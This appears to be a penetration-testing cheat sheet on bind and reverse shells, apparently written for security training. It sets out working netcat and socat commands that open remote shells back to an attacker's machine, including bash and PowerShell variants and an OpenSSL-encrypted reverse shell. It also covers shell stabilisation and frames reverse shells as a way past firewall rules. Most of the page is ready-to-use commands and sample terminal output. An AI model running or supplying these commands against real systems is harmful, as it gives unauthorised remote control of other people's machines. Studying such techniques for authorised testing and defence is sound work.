# Bind and reverse shells

## Attack tree

```text
1 Reverse shell
    1.1 Start a listener on attack machine
    1.2 Start a reverse shell on target machine
2 Bind shell
    2.1 Start a listener on target machine
    2.2 Connect to listener on target from attack machine
```

## Examples

### Netcat shells

Starting a `netcat` listener on Linux for receiving from a reverse shell of the target:

    # nc -lvnp <port-number>

To obtain a bind shell on a target where there is already a listener waiting on a chosen port of the target:

    # nc <target-ip> <chosen-port>

Stabilise a `netcat` shell on Linux systems:

* Spawn a better featured bash shell
* Export to have access to term commands such as `clear`
* Background the shell with `Ctrl+Z`. Back in our own terminal, use `stty raw -echo; fg` to turn off terminal echo 
(which gives access to tab autocompletes, the arrow keys, and `Ctrl+C` to kill processes) and foreground the shell 
again. 

```text
adversary@kali:~# nc -lvnp <port-number>
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::<port-number>
Ncat: Listening on 0.0.0.0:<port-number>
Ncat: Connection from <target IP address>.
Ncat: Connection from <target IP address>:<target port-number>.
python -c 'import pty;pty.spawn("/bin/bash")'
shell@linux:~$ export TERM=xterm
shell@linux:~$ ^Z
[1]+ Stopped        nc -lvnp <port-number>
adversary@kali:~# stty raw -echo; fg
nc -lvnp <port-number>

shell@linux:~$ whoami
shell
```
If the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). 
To fix this, type `reset` and press enter.

For Windows shells, `rlwrap` can give access to history, tab autocompletion and the arrow keys immediately when 
receiving a shell, but some manual stabilisation must still be used to be able to use `Ctrl+C` inside the shell. 
`rlwrap` is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

Then use:

    adversary@kali:~# rlwrap nc -lvnp <port-number>

The third way to stabilise a shell is to use a netcat shell as a stepping stone into a more fully-featured `socat` 
shell. 

### Socat shells

#### Reverse

A basic reverse shell listener in `socat`:

    adversary@kali:~# socat TCP-L:<port-number> -

To connect back to the listener on a Linux target system:

    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

To connect back to the listener on a Windows target system:

    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

#### Bind

Set up a listener on a Linux target:

    socat TCP-L:<PORT> EXEC:"bash -li"

Set up a listener on a Windows target:

    socat TCP-L:<PORT> EXEC:powershell.exe,pipes

The `pipes` argument interfaces between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target machine, connect to the waiting listener with:

    socat TCP:<TARGET-IP>:<TARGET-PORT> -

For a fully stable Linux tty reverse shell, use the `tty` technique.

### Socat encrypted shells

Setting up an OPENSSL-LISTENER using the `tty` technique and a PEM file called `encrypt.pem`:

```text
adversary@kali:~# openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
adversary@kali:~# cat shell.key shell.crt > encrypt.pem
adversary@kali:~# socat OPENSSL-LISTEN:<port-number>,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

Connecting back to this listener from the target machine:

```text
socat OPENSSL:<IP address attack machine>:<port-number>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

* `pty` allocates a pseudoterminal on the target -- part of the stabilisation process
* `stderr` makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
* `sigint` passes any `Ctrl+C` commands through into the sub-process, allowing for `kill` commands inside the shell
* `setsid` creates the process in a new session
* `sane` stabilises the terminal, attempting to "normalise" it.

## Notes

Shells are used for interfacing with a Command Line environment (CLI) like the common `bash` or `sh` programs in 
Linux, and the `cmd.exe` and `Powershell` on Windows. When targeting remote systems it is sometimes possible to force 
an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, 
we want to use this initial access to obtain a shell running on the target.

* Reverse shells are when the target is forced to execute code that connects back to the attack computer. 
This requires setting up a listener which would be used to receive the connection on the attack machine. Reverse 
shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target.
* Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on 
the target. This would then be open up a port to receive on that you can connect to, and obtain remote code execution. 
This has the advantage of not requiring any configuration on the attack network, but may be prevented by firewalls 
protecting the target.

## Tools

* [Netcat](https://www.kali.org/tools/netcat/)
* [Socat](https://www.kali.org/tools/socat/)
* [Socat binaries](https://github.com/3ndG4me/socat/releases)
* [Metasploit -- multi/handler](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/handler)
